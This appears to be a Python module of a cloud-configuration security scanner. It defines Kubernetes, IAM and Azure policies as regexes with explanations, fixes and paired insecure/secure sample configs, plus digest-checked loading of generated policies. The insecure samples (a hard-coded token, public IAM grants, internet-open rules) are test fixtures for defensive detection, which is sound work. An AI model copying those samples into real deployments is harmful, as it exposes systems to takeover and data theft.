        "no seccomp profile is applied",
        "Without a profile the container may issue any syscall the kernel offers, "
        "which is the surface most container escapes are written against.",
        "Set `seccompProfile.type: RuntimeDefault`.",
        "seccompProfile",
    ),
    (
        "SECRET_ENV_VALUE",
        "env",
        r"(?mi)^\s*-?\s*name:\s*[A-Z_]*(?:PASSWORD|SECRET|TOKEN|API_KEY)[A-Z_]*\s*\n\s*value:\s*\S+",
        _HIGH,
        Category.SUSPICIOUS,
        "a credential is written into the manifest",
        "An environment variable with a literal value lives in the manifest, in the "
        "repository and in every copy of both. It is readable by anyone who can read "
        "the cluster's resources, and rotating it is a code change.",
        "Reference a Secret with `valueFrom.secretKeyRef`, or an external secret store.",
        "env",
    ),
)


def _k8s_extra_policies() -> list[IacPolicy]:
    policies: list[IacPolicy] = []
    for (
        family,
        _attribute,
        pattern,
        severity,
        category,
        subject,
        consequence,
        fix,
        sample,
    ) in _K8S_EXTRA:
        prefix = "SUSPECT" if category is Category.SUSPICIOUS else "POLICY"
        absent = family.startswith("NO_") or family == "DEFAULT_SERVICE_ACCOUNT"
        body = "kind: Pod\nmetadata:\n  name: example\nspec:\n  containers:\n    - name: app\n"
        samples = {
            "limits": (
                body + "      resources:\n        requests:\n          cpu: 100m\n",
                body + "      resources:\n        limits:\n          cpu: 500m\n",
            ),
            "serviceAccountName": (
                body,
                "kind: Pod\nmetadata:\n  name: example\nspec:\n  serviceAccountName: app\n"
                "  containers:\n    - name: app\n",
            ),
            "hostPort": (
                body + "      ports:\n        - hostPort: 8080\n",
                body + "      ports:\n        - containerPort: 8080\n",
            ),
            "runAsNonRoot": (
                body,
                body + "      securityContext:\n        runAsNonRoot: true\n",
            ),
            "seccompProfile": (
                body,
                body
                + "      securityContext:\n        seccompProfile:\n          type: RuntimeDefault\n",
            ),
            "env": (
                body + "      env:\n        - name: API_TOKEN\n          value: sk-live-aaaa\n",
                body + "      env:\n        - name: API_TOKEN\n          valueFrom:\n"
                "            secretKeyRef:\n              name: creds\n              key: token\n",
            ),
        }[sample]
        policies.append(
            IacPolicy(
                id=f"{prefix}.K8S.{family}.001",
                title=f"Kubernetes workload: {subject}",
                message=consequence,
                remediation=fix,
                severity=severity,
                confidence=Confidence.MEDIUM if absent else Confidence.HIGH,
                category=category,
                resources=_WORKLOAD_KINDS,
                forbid=() if absent else (pattern,),
                require=(pattern,) if absent else (),
                bad=samples[0],
                good=samples[1],
            )
        )
    return policies


# ---------------------------------------------------------------------------
# Identity and access
# ---------------------------------------------------------------------------

_IDENTITY: tuple[IacPolicy, ...] = (
    IacPolicy(
        id="SUSPECT.IAC.PUBLIC_IAM.GOOGLE_PROJECT_IAM_MEMBER.001",
        title="google_project_iam_member: a role is granted to everyone",
        message=(
            "`allUsers` and `allAuthenticatedUsers` are not groups you control. A role "
            "bound to either is held by anyone on the internet, or anyone with any "
            "Google account."
        ),
        remediation="Bind the role to a named principal or a group you administer.",
        severity=_HIGH,
        confidence=Confidence.HIGH,
        category=Category.SUSPICIOUS,
        resources=(
            "google_project_iam_member",
            "google_project_iam_binding",
            "google_folder_iam_member",
            "google_organization_iam_member",
            "google_cloud_run_service_iam_member",
            "google_cloudfunctions_function_iam_member",
        ),
        forbid=(r"\"all(?:Users|AuthenticatedUsers)\"",),
        bad='  role = "roles/viewer"\n  member = "allUsers"\n',
        good='  role = "roles/viewer"\n  member = "user:someone@example.com"\n',
    ),
    IacPolicy(
        id="SUSPECT.IAC.OWNER_ROLE.GOOGLE_PROJECT_IAM_MEMBER.001",
        title="google_project_iam_member: the owner role is granted directly",
        message=(
            "`roles/owner` includes every permission in the project, including "
            "changing the bindings that granted it. A credential holding it cannot be "
            "contained by any other control in the project."
        ),
        remediation="Grant the narrowest predefined role that covers the work, or a custom role.",
        severity=_MEDIUM,
        confidence=Confidence.HIGH,
        category=Category.SUSPICIOUS,
        resources=("google_project_iam_member", "google_project_iam_binding"),
        forbid=(r"role\s*=\s*\"roles/owner\"",),
        bad='  role = "roles/owner"\n  member = "user:someone@example.com"\n',
        good='  role = "roles/viewer"\n  member = "user:someone@example.com"\n',
    ),
    IacPolicy(
        id="SUSPECT.IAC.OWNER_ROLE.AZURERM_ROLE_ASSIGNMENT.001",
        title="azurerm_role_assignment: Owner or Contributor is assigned",
        message=(
            "Owner carries every permission in the scope plus the ability to grant it "
            "to others; Contributor carries every permission except that. At "
            "subscription scope either one is the subscription."
        ),
        remediation="Assign a built-in role scoped to the resources the principal works on.",
        severity=_MEDIUM,
        confidence=Confidence.MEDIUM,
        category=Category.SUSPICIOUS,
        resources=("azurerm_role_assignment",),
        forbid=(r"role_definition_name\s*=\s*\"(?:Owner|Contributor)\"",),
        bad='  scope = "/subscriptions/x"\n  role_definition_name = "Owner"\n',
        good='  scope = "/subscriptions/x/resourceGroups/rg"\n  role_definition_name = "Reader"\n',
    ),
    IacPolicy(
        id="POLICY.IAC.NO_MFA.AWS_IAM_USER.001",
        title="aws_iam_user: a long-lived user is created",
        message=(
            "An IAM user is a permanent credential that no session policy expires. "
            "Where a role can be assumed with a short-lived token, a user's access key "
            "stays valid until somebody remembers to rotate it."
        ),
        remediation=(
            "Use a role with workload identity or SSO. If a user is unavoidable, "
            "require MFA and rotate its keys on a schedule."
        ),
        severity=_LOW,
        confidence=Confidence.MEDIUM,
        category=Category.POLICY,
        resources=("aws_iam_user",),
        forbid=(r"name\s*=",),
        bad='  name = "ci-deploy"\n',
        good="  # replaced by a role assumed through OIDC\n",
    ),
    IacPolicy(
        id="SUSPECT.IAC.WILDCARD_PRINCIPAL.AWS_IAM_POLICY.001",
        title="A resource policy trusts every principal",
        message=(
            '`"Principal": "*"` in a resource policy means any AWS account, and '
            "usually any anonymous caller. Combined with a permissive action it is a "
            "public grant on a private resource."
        ),
        remediation="Name the accounts, roles or services the policy is for.",
        severity=_HIGH,
        confidence=Confidence.MEDIUM,
        category=Category.SUSPICIOUS,
        resources=(
            "aws_iam_policy",
            "aws_iam_role_policy",
            "aws_s3_bucket_policy",
            "aws_sqs_queue_policy",
            "aws_sns_topic_policy",
            "aws_kms_key",
            "aws_secretsmanager_secret_policy",
        ),
        forbid=(r"\\?\"Principal\\?\"\s*:\s*\\?\"\*\\?\"",),
        # A wildcard principal narrowed by a condition is how a service-to-service
        # policy is written, and the condition is the control.
        unless=(r"\"Condition\"",),
        bad='  policy = "{\\"Statement\\":[{\\"Effect\\":\\"Allow\\",\\"Principal\\":\\"*\\"}]}"\n',
        good='  policy = "{\\"Statement\\":[{\\"Effect\\":\\"Allow\\",\\"Principal\\":{\\"AWS\\":\\"arn:aws:iam::1:root\\"}}]}"\n',
    ),
)


# ---------------------------------------------------------------------------
# Azure written natively: Bicep and ARM
# ---------------------------------------------------------------------------
#
# The generated Azure policies are in Terraform's spelling, and a Bicep file has
# none of those names: `public_network_access_enabled` is `publicNetworkAccess`,
# `enable_https_traffic_only` is `supportsHttpsTrafficOnly`. The same control,
# written for the two formats Azure itself publishes.
#
# One pattern serves both, because the only difference is the quoting: Bicep
# writes `minimumTlsVersion: 'TLS1_2'` and an ARM template writes
# `"minimumTlsVersion": "TLS1_2"`.

_AZURE_NATIVE: tuple[tuple[str, str, str, str, Severity, Category, str, str, str, str], ...] = (
    (
        "PLAINTEXT",
        "Microsoft.Storage/storageAccounts",
        "supportsHttpsTrafficOnly",
        r"supportsHttpsTrafficOnly\"?\s*:\s*false",
        _HIGH,
        Category.SUSPICIOUS,
        "the storage account accepts plain HTTP",
        "Blobs, keys in query strings and everything else the account serves cross "
        "the network readable and modifiable.",
        "Set `supportsHttpsTrafficOnly: true`.",
        "false|true",
    ),
    (
        "WEAK_TLS",
        "Microsoft.Storage/storageAccounts",
        "minimumTlsVersion",
        r"minimumTlsVersion\"?\s*:\s*['\"]TLS1_[01]['\"]",
        _MEDIUM,
        Category.POLICY,
        "an obsolete TLS version is accepted",
        "TLS 1.0 and 1.1 are withdrawn and have practical attacks against them.",
        "Set `minimumTlsVersion: 'TLS1_2'`.",
        "'TLS1_0'|'TLS1_2'",
    ),
    (
        "PUBLIC_STORAGE",
        "Microsoft.Storage/storageAccounts",
        "allowBlobPublicAccess",
        r"allowBlobPublicAccess\"?\s*:\s*true",
        _HIGH,
        Category.SUSPICIOUS,
        "containers may be made public",
        "With public blob access allowed, any container in the account can be opened "
        "to anonymous readers by a change nobody reviews as infrastructure.",
        "Set `allowBlobPublicAccess: false`.",
        "true|false",
    ),
    (
        "SHARED_KEY_AUTH",
        "Microsoft.Storage/storageAccounts",
        "allowSharedKeyAccess",
        r"allowSharedKeyAccess\"?\s*:\s*true",
        _MEDIUM,
        Category.POLICY,
        "the account key authenticates callers",
        "The account key is one credential for everything in the account: it cannot "
        "be scoped, it is not attributable, and it does not expire.",
        "Set `allowSharedKeyAccess: false` and use Entra identities.",
        "true|false",
    ),
    (
        "PUBLIC_ACCESS",
        "Microsoft.*",
        "publicNetworkAccess",
        r"publicNetworkAccess\"?\s*:\s*['\"]Enabled['\"]",
        _MEDIUM,
        Category.SUSPICIOUS,
        "the resource answers on a public endpoint",
        "Its own authentication is the only control between an anonymous scanner and "
        "the data behind it, and scanning for exactly this is continuous.",
        "Set `publicNetworkAccess: 'Disabled'` and use a private endpoint.",
        "'Enabled'|'Disabled'",
    ),
    (
        "SHARED_KEY_AUTH",
        "Microsoft.*",
        "disableLocalAuth",
        r"disableLocalAuth\"?\s*:\s*false",
        _MEDIUM,
        Category.POLICY,
        "shared-key authentication is enabled",
        "Local authentication is a connection string with an embedded key: it cannot "
        "be scoped, it is not attributable, and it does not expire.",
        "Set `disableLocalAuth: true` and authenticate with a managed identity.",
        "false|true",
    ),
    (
        "PLAINTEXT",
        "Microsoft.Web/sites",
        "httpsOnly",
        r"httpsOnly\"?\s*:\s*false",
        _MEDIUM,
        Category.SUSPICIOUS,
        "the site answers plain HTTP",
        "Session cookies, tokens in headers and request bodies are readable and "
        "modifiable on the path.",
        "Set `httpsOnly: true`.",
        "false|true",
    ),
    (
        "PLAINTEXT",
        "Microsoft.Web/sites",
        "ftpsState",
        r"ftpsState\"?\s*:\s*['\"]AllAllowed['\"]",
        _MEDIUM,
        Category.SUSPICIOUS,
        "deployment over plain FTP is allowed",
        "`AllAllowed` accepts FTP as well as FTPS, and the deployment credential "
        "crosses the network with it.",
        "Set `ftpsState: 'FtpsOnly'`, or 'Disabled' if nothing deploys over FTP.",
        "'AllAllowed'|'FtpsOnly'",
    ),
    (
        "SHARED_KEY_AUTH",
        "Microsoft.ContainerRegistry/registries",
        "adminUserEnabled",
        r"adminUserEnabled\"?\s*:\s*true",
        _MEDIUM,
        Category.SUSPICIOUS,
        "the shared admin account is enabled",
        "One username and password for the whole registry: unscopable, "
        "unattributable, and the credential that ends up in a pipeline variable.",
        "Set `adminUserEnabled: false` and authenticate with an identity.",
        "true|false",
    ),
    (
        "NO_AUTH",
        "Microsoft.ContainerRegistry/registries",
        "anonymousPullEnabled",
        r"anonymousPullEnabled\"?\s*:\s*true",
        _HIGH,
        Category.SUSPICIOUS,
        "anyone may pull images from the registry",
        "Images hold application code, build arguments and frequently a credential "
        "somebody baked into a layer.",
        "Set `anonymousPullEnabled: false`.",
        "true|false",
    ),
    (
        "DELETION_PROTECTION",
        "Microsoft.KeyVault/vaults",
        "enablePurgeProtection",
        r"enablePurgeProtection\"?\s*:\s*false",
        _MEDIUM,
        Category.POLICY,
        "a deleted vault can be purged immediately",
        "An attacker who can delete can also destroy the recovery path, and so can a mistake.",
        "Set `enablePurgeProtection: true`.",
        "false|true",
    ),
    (
        "DELETION_PROTECTION",
        "Microsoft.KeyVault/vaults",
        "enableSoftDelete",
        r"enableSoftDelete\"?\s*:\s*false",
        _MEDIUM,
        Category.POLICY,
        "a deleted secret is gone immediately",
        "There is no window in which a deletion can be reversed, which is the window "
        "an incident response needs.",
        "Set `enableSoftDelete: true`.",
        "false|true",
    ),
    (
        "RBAC",
        "Microsoft.KeyVault/vaults",
        "enableRbacAuthorization",
        r"enableRbacAuthorization\"?\s*:\s*false",
        _LOW,
        Category.POLICY,
        "access is governed by vault access policies rather than RBAC",
        "Access policies sit outside the identity model the rest of the subscription "
        "uses, so a review of who can reach this vault has to be done separately and "
        "usually is not.",
        "Set `enableRbacAuthorization: true`.",
        "false|true",
    ),
    (
        "PASSWORD_AUTH",
        "Microsoft.Compute/virtualMachines",
        "disablePasswordAuthentication",
        r"disablePasswordAuthentication\"?\s*:\s*false",
        _MEDIUM,
        Category.SUSPICIOUS,
        "SSH password authentication is enabled",
        "A password is guessable at internet scale, and a VM with a public address "
        "receives that traffic continuously.",
        "Set `disablePasswordAuthentication: true` and use SSH keys.",
        "false|true",
    ),
    (
        "OPEN_INGRESS",
        "Microsoft.Network/networkSecurityGroups",
        "sourceAddressPrefix",
        r"sourceAddressPrefix\"?\s*:\s*['\"](?:\*|Internet|0\.0\.0\.0/0)['\"]",
        _HIGH,
        Category.SUSPICIOUS,
        "a security rule admits the whole internet",
        "A source prefix of `*`, `Internet` or `0.0.0.0/0` opens the rule's ports to "
        "every address there is, which is scanned continuously.",
        "Name the prefixes that need access, or front the service with a gateway.",
        "'*'|'10.0.0.0/8'",
    ),
    (
        "NETWORK_DEFAULT_ALLOW",
        "Microsoft.*",
        "defaultAction",
        r"defaultAction\"?\s*:\s*['\"]Allow['\"]",
        _MEDIUM,
        Category.SUSPICIOUS,
        "the network rules default to allowing everything",
        "A `networkAcls` block whose default is Allow is a firewall that permits "
        "what it did not consider, which is the opposite of what the block is for.",
        "Set `defaultAction: 'Deny'` and list the networks that may reach it.",
        "'Allow'|'Deny'",
    ),
)


def _azure_native_policies() -> list[IacPolicy]:
    """The same controls, for the two formats Azure itself publishes."""
    policies: list[IacPolicy] = []
    for (
        family,
        resource,
        attribute,
        pattern,
        severity,
        category,
        subject,
        consequence,
        fix,
        sample_pair,
    ) in _AZURE_NATIVE:
        insecure, secure = sample_pair.split("|")
        prefix = "SUSPECT" if category is Category.SUSPICIOUS else "POLICY"
        short = resource.replace("Microsoft.", "").replace("/", "_").replace("*", "ANY").upper()
        policies.append(
            IacPolicy(
                id=f"{prefix}.AZURE.{family}.{short}_{attribute.upper()}.001",
                title=f"{resource}: {subject}",
                message=consequence,
                remediation=fix,
                severity=severity,
                confidence=Confidence.HIGH,
                category=category,
                resources=(f"azure:{resource}",),
                forbid=(pattern,),
                bad=f"  name: 'example'\n  properties: {{\n    {attribute}: {insecure}\n  }}\n",
                good=f"  name: 'example'\n  properties: {{\n    {attribute}: {secure}\n  }}\n",
            )
        )
    return policies


CURATED: tuple[IacPolicy, ...] = tuple(
    _at_rest_policies()
    + _in_transit_policies()
    + _public_policies()
    + _presence_policies(
        _LOGGING,
        family="LOGGING",
        subject="audit logging",
        consequence=_LOGGING_CONSEQUENCE,
        remediation="Configure `{attribute}` so this resource's activity is recorded.",
    )
    + _presence_policies(
        _BACKUP,
        family="BACKUP",
        subject="a backup retention period",
        consequence=(
            "Nothing is retained, so a deletion or a corruption is permanent -- and "
            "the first time anybody checks is after one."
        ),
        remediation="Set `{attribute}` to the number of days the data is worth.",
    )
    + _presence_policies(
        _DELETION_PROTECTION,
        family="DELETION_PROTECTION",
        subject="deletion protection",
        consequence=(
            "The resource can be destroyed by one apply, one console click or one "
            "credential that should not have had the permission."
        ),
        remediation="Set `{attribute} = true` on anything holding state you cannot rebuild.",
    )
    + _zero_retention_policies()
    + _open_storage_policies()
    + _public_access_block_policies()
    + _weak_tls_policies()
    + list(_PLAINTEXT)
    + _k8s_policies()
    + _compose_policies()
    + _cfn_policies()
    + _presence_policies(
        _AT_REST_EXTRA,
        family="ENCRYPT_AT_REST",
        subject="a customer-managed key",
        consequence=_AT_REST_CONSEQUENCE,
        remediation="Set `{attribute}` to a key you control.",
    )
    + _presence_policies(
        _LOGGING_EXTRA,
        family="LOGGING",
        subject="audit logging",
        consequence=_LOGGING_CONSEQUENCE,
        remediation="Configure `{attribute}` so this resource's activity is recorded.",
    )
    + _deprecated_runtime_policies()
    + list(_TERRAFORM_HYGIENE)
    + _dockerfile_policies()
    + _k8s_extra_policies()
    + list(_IDENTITY)
    + _azure_native_policies()
)

#: Where the generated half lives, beside the advisory data and for the same
#: reason: it is large, it is regenerated on a schedule rather than edited, and
#: it ships with a metadata sidecar saying what it was built from.
DATA_DIR: Final = Path(__file__).parent / "data"
GENERATED_NAME: Final = "iac-policies.json.gz"
GENERATED_META: Final = "iac-policies-meta.json"
GENERATED_DIGESTS: Final = "iac-policies-digests.json"

_REFUSED: set[str] = set()
"""Generated files refused this process because their digest did not match.

Module-level because `generated_rows` is cached and lazy: the check happens on
first use, which is well after the detector was constructed, so the result has
to be readable afterwards rather than returned."""


def refused_files() -> tuple[str, ...]:
    """Generated policy files that were not loaded, for the detector to report."""
    return tuple(sorted(_REFUSED))


def _digests_match(path: Path) -> bool:
    """Whether a file agrees with the manifest shipped beside it.

    An absent manifest is not a failure: a checkout that has never run
    `scripts/build_iac_policies.py` has neither the data nor the manifest. A
    manifest that disagrees is something to say out loud -- half a policy set is
    worse than none, because the count still looks healthy.
    """
    try:
        recorded = json.loads((path.parent / GENERATED_DIGESTS).read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return True
    if not isinstance(recorded, dict) or path.name not in recorded:
        return True
    try:
        return hashlib.sha256(path.read_bytes()).hexdigest() == str(recorded[path.name])
    except OSError:
        return False


@functools.cache
def generated_rows() -> dict[str, tuple[dict[str, Any], ...]]:
    """The schema-generated policies, grouped by the resource they are about.

    Rows, not `IacPolicy` objects. There are more than a thousand of them and
    each carries patterns to compile, while a scan asks about the handful of
    resource kinds a file actually declares -- so the grouping is built once and
    the objects are built by `IacDetector` for the kinds it meets. A scan with
    no infrastructure in it constructs none of them.

    Missing is normal rather than an error: a checkout where
    `scripts/build_iac_policies.py` has not run has the curated table and says
    so through `generated_meta()`.
    """
    path = DATA_DIR / GENERATED_NAME
    if path.exists() and not _digests_match(path):
        # Not read at all. A policy set that has been edited since it was built
        # is not a smaller policy set, it is one whose contents nobody can
        # account for, and loading part of it would report a healthy count.
        _REFUSED.add(path.name)
        return {}
    try:
        with gzip.open(path, "rt", encoding="utf-8") as handle:
            rows = json.load(handle)
    except (OSError, ValueError, EOFError, gzip.BadGzipFile):
        return {}
    if not isinstance(rows, list):
        return {}
    grouped: dict[str, list[dict[str, Any]]] = {}
    for row in rows:
        if not isinstance(row, dict):
            continue
        for resource in row.get("resources") or ():
            grouped.setdefault(str(resource), []).append(row)
    return {resource: tuple(items) for resource, items in grouped.items()}


@functools.cache
def generated_meta() -> dict[str, Any]:
    """What the generated set was built from, for `rules list` and the report."""
    try:
        return dict(json.loads((DATA_DIR / GENERATED_META).read_text(encoding="utf-8")))
    except (OSError, ValueError):
        return {}


def policy_from_row(row: dict[str, Any]) -> IacPolicy:
    """Build one generated policy. The shape is the script's output contract."""
    return IacPolicy(
        id=str(row["id"]),
        title=str(row["title"]),
        message=str(row["message"]),
        remediation=str(row["remediation"]),
        severity=_SEVERITY_BY_NAME[str(row["severity"])],
        confidence=_CONFIDENCE_BY_NAME[str(row["confidence"])],
        category=Category.SUSPICIOUS if row["category"] == "suspicious" else Category.POLICY,
        resources=tuple(str(r) for r in row.get("resources") or ()),
        forbid=tuple(str(p) for p in row.get("forbid") or ()),
        require=tuple(str(p) for p in row.get("require") or ()),
        unless=tuple(str(p) for p in row.get("unless") or ()),
        bad=str(row.get("bad", "")),
        good=str(row.get("good", "")),
    )


_SEVERITY_BY_NAME: Final[dict[str, Severity]] = {
    "critical": Severity.CRITICAL,
    "high": _HIGH,
    "medium": _MEDIUM,
    "low": _LOW,
    "info": Severity.INFO,
}
_CONFIDENCE_BY_NAME: Final[dict[str, Confidence]] = {
    "high": Confidence.HIGH,
    "medium": Confidence.MEDIUM,
    "low": Confidence.LOW,
}


def generated_policies() -> tuple[IacPolicy, ...]:
    """Every generated policy, built. For the catalogue and the suite, not a scan."""
    seen: dict[str, IacPolicy] = {}
    for rows in generated_rows().values():
        for row in rows:
            identifier = str(row["id"])
            if identifier not in seen:
                seen[identifier] = policy_from_row(row)
    return tuple(seen.values())


def all_policies() -> tuple[IacPolicy, ...]:
    """Curated plus generated, which is what `rules list` and the matrix show."""
    return CURATED + generated_policies()


#: Kept as the name the rest of the code and the tests already use.
POLICIES = CURATED

__all__ = [
    "CURATED",
    "GENERATED_DIGESTS",
    "POLICIES",
    "all_policies",
    "generated_meta",
    "generated_policies",
    "generated_rows",
    "policy_from_row",
    "refused_files",
]
